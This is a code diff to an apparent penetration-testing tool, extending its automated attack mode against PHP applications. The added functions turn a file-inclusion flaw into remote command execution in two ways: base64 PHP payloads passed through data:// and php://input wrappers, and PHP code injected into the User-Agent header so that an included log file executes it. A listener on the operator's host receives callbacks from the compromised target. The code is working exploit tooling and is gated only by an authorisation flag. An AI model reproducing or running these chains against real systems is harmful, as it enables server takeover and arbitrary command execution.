@@ -32,6 +32,13 @@ from .exploit import (
     ExploitOptions,
     run_exploit,
 )
+from .exploit import (
+    _build_callback_php,
+    _exec_snippet,
+    _shell_literal,
+    _pick_exec_functions,
+)
+from .listener import CallbackListener
 from .http import HttpClient
 from .inventory import InventoryOptions, collect
 from .models import CaseFile, Finding, ScenarioRun, TargetProfile
@@ -39,7 +46,7 @@ from .probe import run_probe
 from .prove import ProveEngine, ProveLimits, ProveOptions
 from .report import build_document, write_reports
 from .scenarios import SCENARIOS, scenario_list, select
-from .util import new_id, slugify, utcnow
+from .util import new_id, new_nonce, slugify, utcnow
 from .version import CVE_618, CVE_619, VERSION
 
 PROOF_STATUSES = {
@@ -564,6 +571,172 @@ def _run_exploit(args: argparse.Namespace) -> int:
     return rc
 
 
+def _try_wrapper_rce(
+    client: HttpClient,
+    profile: TargetProfile,
+    store: RunStore,
+    lfi_endpoint: Any,
+    wrapper_type: str,
+    command: str,
+    exec_func: Optional[str],
+    listener: Optional[Any],
+    canary_nonce: str,
+    timeout: float = 10.0,
+) -> Dict[str, Any]:
+    """Try direct RCE via data:// or php://input wrapper through an LFI.
+
+    Returns a dict with 'success', 'output', 'callback_received', 'notes'.
+    """
+    from .discover import _safe_get, _safe_post, DiscoverBudget, _body_text
+    result: Dict[str, Any] = {
+        "success": False, "output": None, "callback_received": False,
+        "notes": [], "request_refs": [],
+    }
+    budget = DiscoverBudget(max_requests=20)
+
+    exec_funcs = _pick_exec_functions(exec_func)
+    for func in exec_funcs[:3]:
+        cmd_escaped = _shell_literal(command)
+        exec_code = _exec_snippet(cmd_escaped, func)
+
+        if listener:
+            callback_url = listener.callback_url(canary_nonce)
+            callback_code = _build_callback_php(callback_url)
+            php_code = f"<?php {exec_code}echo '___START___'.($o??'').'___END___';{callback_code}?>"
+        else:
+            php_code = f"<?php {exec_code}echo '___START___'.($o??'').'___END___';?>"
+
+        if wrapper_type == "data":
+            import base64
+            b64 = base64.b64encode(php_code.encode()).decode()
+            payload_path = f"data://text/plain;base64,{b64}"
+            include_url = lfi_endpoint.build_include_url(payload_path)
+            pair = _safe_get(
+                client, include_url, store, budget,
+                scenario_id="auto-wrapper-rce",
+                timeout=timeout,
+                notes=f"wrapper RCE via data:// ({func})",
+            )
+        elif wrapper_type == "php_input":
+            from urllib.parse import quote as _quote
+            parsed = urlsplit(lfi_endpoint.url)
+            include_url = f"{lfi_endpoint.url}?{lfi_endpoint.param}={_quote('php://input', safe='')}"
+            pair = _safe_post(
+                client, include_url, php_code.encode(),
+                "application/x-www-form-urlencoded",
+                store, budget,
+                scenario_id="auto-wrapper-rce",
+                timeout=timeout,
+                notes=f"wrapper RCE via php://input ({func})",
+            )
+        else:
+            break
+
+        if pair is None:
+            result["notes"].append(f"wrapper {wrapper_type}:// request failed ({func})")
+            continue
+
+        exchange, item = pair
+        result["request_refs"].append(item.id)
+        body = _body_text(exchange)
+
+        if "___START___" in body and "___END___" in body:
+            start = body.index("___START___") + len("___START___")
+            end = body.index("___END___")
+            output = body[start:end]
+            if output and "<?php" not in output:
+                result["output"] = output
+                result["notes"].append(f"command output via {wrapper_type}:// ({func})")
+                if listener:
+                    cb = listener.wait_for_callback(canary_nonce, timeout=5.0)
+                    if cb:
+                        result["callback_received"] = True
+                        result["success"] = True
+                        result["notes"].append("callback confirmed RCE")
+                return result
+            else:
+                result["notes"].append(f"markers reflected (not executed) via {func}")
+                continue
+
+    return result
+
+
+def _try_log_poison_rce(
+    client: HttpClient,
+    profile: TargetProfile,
+    store: RunStore,
+    lfi_endpoint: Any,
+    log_path: str,
+    command: str,
+    exec_func: Optional[str],
+    listener: Optional[Any],
+    canary_nonce: str,
+    timeout: float = 10.0,
+) -> Dict[str, Any]:
+    """Try RCE via log poisoning: inject PHP in User-Agent, then include log."""
+    from .discover import _safe_get, DiscoverBudget, _body_text
+    result: Dict[str, Any] = {
+        "success": False, "output": None, "callback_received": False,
+        "notes": [], "request_refs": [],
+    }
+    budget = DiscoverBudget(max_requests=20)
+
+    exec_funcs = _pick_exec_functions(exec_func)
+    for func in exec_funcs[:3]:
+        cmd_escaped = _shell_literal(command)
+        exec_code = _exec_snippet(cmd_escaped, func)
+
+        if listener:
+            callback_url = listener.callback_url(canary_nonce)
+            callback_code = _build_callback_php(callback_url)
+            php_code = f"<?php {exec_code}echo '___START___'.($o??'').'___END___';{callback_code}?>"
+        else:
+            php_code = f"<?php {exec_code}echo '___START___'.($o??'').'___END___';?>"
+
+        _safe_get(
+            client, profile.base_url, store, budget,
+            scenario_id="auto-log-poison-inject",
+            timeout=timeout,
+            notes=f"log poison inject ({func})",
+            extra_headers={"User-Agent": php_code},
+        )
+
+        include_url = lfi_endpoint.build_include_url(log_path)
+        pair = _safe_get(
+            client, include_url, store, budget,
+            scenario_id="auto-log-poison-trigger",
+            timeout=timeout,
+            notes=f"log poison trigger via {log_path} ({func})",
+        )
+        if pair is None:
+            result["notes"].append(f"log include failed ({func})")
+            continue
+
+        exchange, item = pair
+        result["request_refs"].append(item.id)
+        body = _body_text(exchange)
+
+        if "___START___" in body and "___END___" in body:
+            start = body.index("___START___") + len("___START___")
+            end = body.index("___END___")
+            output = body[start:end]
+            if output and "<?php" not in output:
+                result["output"] = output
+                result["notes"].append(f"command output via log poisoning ({func})")
+                if listener:
+                    cb = listener.wait_for_callback(canary_nonce, timeout=5.0)
+                    if cb:
+                        result["callback_received"] = True
+                        result["success"] = True
+                        result["notes"].append("callback confirmed RCE")
+                return result
+            else:
+                result["notes"].append(f"markers reflected via log ({func})")
+                continue
+
+    return result
+
+
 def _run_auto(args: argparse.Namespace) -> int:
     if not args.ack_authorised:
         _abort(
@@ -637,12 +810,29 @@ def _run_auto(args: argparse.Namespace) -> int:
     # --- Determine which chains to try ---
     chains_to_try: List[str] = []
     wrapper_mode = None
+    log_poison_path = None
 
     if discover_result and discover_result.wrapper_works:
         wrapper_mode = discover_result.wrapper_works
         print(f"\n    ! PHP wrapper execution available ({wrapper_mode}://)")
         print("      direct code execution possible without session injection")
 
+    if discover_result and discover_result.log_poisoning_path:
+        log_poison_path = discover_result.log_poisoning_path
+        print(f"\n    ! log poisoning available: {log_poison_path}")
+
+    # Upload progress warnings
+    if discover_result and discover_result.phpinfo.found:
+        if discover_result.phpinfo.upload_progress_cleanup is True:
+            print("    ! session.upload_progress.cleanup=On — chain A race window is narrow")
+        if discover_result.phpinfo.upload_progress_enabled is False:
+            print("    ! session.upload_progress.enabled=Off — session injection will not work")
+
+    # Wrapper RCE comes first (simplest), then log poisoning, then standard chains
+    if wrapper_mode and discover_result:
+        chains_to_try.append("WRAPPER")
+    if log_poison_path and discover_result:
+        chains_to_try.append("LOG_POISON")
     if lfi_path:
         chains_to_try.append("A")
         if args.callback_port is not None:
@@ -650,7 +840,7 @@ def _run_auto(args: argparse.Namespace) -> int:
     if args.gadget:
         chains_to_try.append("B")
 
-    if not chains_to_try and not wrapper_mode:
+    if not chains_to_try:
         print("\n  [!] no viable exploit path found:")
         if not lfi_path:
             print("      - no LFI discovered (try --lfi-path if you know one)")
@@ -671,6 +861,23 @@ def _run_auto(args: argparse.Namespace) -> int:
         findings = assess_all(case)
         return _finalise(store, case, findings, outdir, args.json)
 
+    # --- Start callback listener (shared across all chains) ---
+    listener: Optional[CallbackListener] = None
+    if args.callback_port is not None:
+        try:
+            listener = CallbackListener(
+                port=args.callback_port,
+                bind=args.callback_bind,
+                target_host=urlsplit(args.target).hostname or "",
+                target_port=urlsplit(args.target).port or 80,
+            )
+            if args.callback_ip:
+                listener.local_ip = args.callback_ip
+            listener.start()
+        except OSError as exc:
+            print(f"    ! callback listener failed: {exc}")
+            listener = None
+
     # --- Execute chains ---
     all_runs: List[ScenarioRun] = list(previous_runs)
     chain_results: List[Dict[str, Any]] = []
@@ -689,8 +896,71 @@ def _run_auto(args: argparse.Namespace) -> int:
 
         step = 4 + chains_to_try.index(chain)
         total = 3 + len(chains_to_try) + 1
-        print(f"\n  [{step}/{total}] exploit chain {chain}")
+        print(f"\n  [{step}/{total}] exploit: {chain}")
 
+        # --- Wrapper RCE (data:// or php://input) ---
+        if chain == "WRAPPER" and discover_result:
+            best_lfi = discover_result.best_lfi()
+            if best_lfi and wrapper_mode:
+                canary = new_nonce("P2SAUTO")
+                wr = _try_wrapper_rce(
+                    client, profile, store, best_lfi, wrapper_mode,
+                    args.command, args.exec_func, listener, canary, args.timeout,
+                )
+                chain_entry = {
+                    "chain": f"WRAPPER-{wrapper_mode}",
+                    "rce_confirmed": wr["success"],
+                    "callback_received": wr["callback_received"],
+                    "response_markers_seen": wr.get("output") is not None,
+                    "errors": [],
+                    "notes": wr["notes"],
+                }
+                chain_results.append(chain_entry)
+                if wr["success"]:
+                    rce_confirmed = True
+                    print(f"    [RCE CONFIRMED] via {wrapper_mode}:// wrapper")
+                    if wr["output"]:
+                        for line in wr["output"].strip().splitlines():
+                            print(f"      | {line}")
+                elif wr["output"]:
+                    print(f"    [UNVERIFIED OUTPUT] via {wrapper_mode}://")
+                    for line in wr["output"].strip().splitlines():
+                        print(f"      | {line}")
+                else:
+                    print(f"    wrapper {wrapper_mode}://: {wr['notes'][-1] if wr['notes'] else 'failed'}")
+            continue
+
+        # --- Log poisoning RCE ---
+        if chain == "LOG_POISON" and discover_result and log_poison_path:
+            best_lfi = discover_result.best_lfi()
+            if best_lfi:
+                canary = new_nonce("P2SAUTO")
+                lr = _try_log_poison_rce(
+                    client, profile, store, best_lfi, log_poison_path,
+                    args.command, args.exec_func, listener, canary, args.timeout,
+                )
+                chain_entry = {
+                    "chain": "LOG_POISON",
+                    "rce_confirmed": lr["success"],
+                    "callback_received": lr["callback_received"],
+                    "response_markers_seen": lr.get("output") is not None,
+                    "errors": [],
+                    "notes": lr["notes"],
+                }
+                chain_results.append(chain_entry)
+                if lr["success"]:
+                    rce_confirmed = True
+                    print(f"    [RCE CONFIRMED] via log poisoning ({log_poison_path})")
+                    if lr["output"]:
+                        for line in lr["output"].strip().splitlines():
+                            print(f"      | {line}")
+                elif lr["output"]:
+                    print(f"    [UNVERIFIED OUTPUT] via log poisoning")
+                else:
+                    print(f"    log poisoning: {lr['notes'][-1] if lr['notes'] else 'failed'}")
+            continue
+
+        # --- Standard chains A/B/C ---
         budget = ExploitBudget(
             max_requests=args.max_exploit_requests,
             max_bytes=args.max_bytes,
@@ -764,6 +1034,10 @@ def _run_auto(args: argparse.Namespace) -> int:
             reasons = exploit_result.errors or ["no output"]
             print(f"    chain {chain}: {reasons[0]}")
 
+    # --- Clean up listener ---
+    if listener is not None:
+        listener.stop()
+
     # --- Finalize ---
     step_final = 4 + len(chains_to_try)
     total_final = step_final
@@ -808,6 +1082,8 @@ def _run_auto(args: argparse.Namespace) -> int:
                 print(f"  framework     : {discover_result.framework}")
             if discover_result.wrapper_works:
                 print(f"  wrapper       : {discover_result.wrapper_works}://")
+            if discover_result.log_poisoning_path:
+                print(f"  log poison    : {discover_result.log_poisoning_path}")
         print(f"  chains tried  : {', '.join(c['chain'] for c in chain_results) or 'none'}")
         if rce_confirmed:
             print(f"  result        : RCE CONFIRMED")
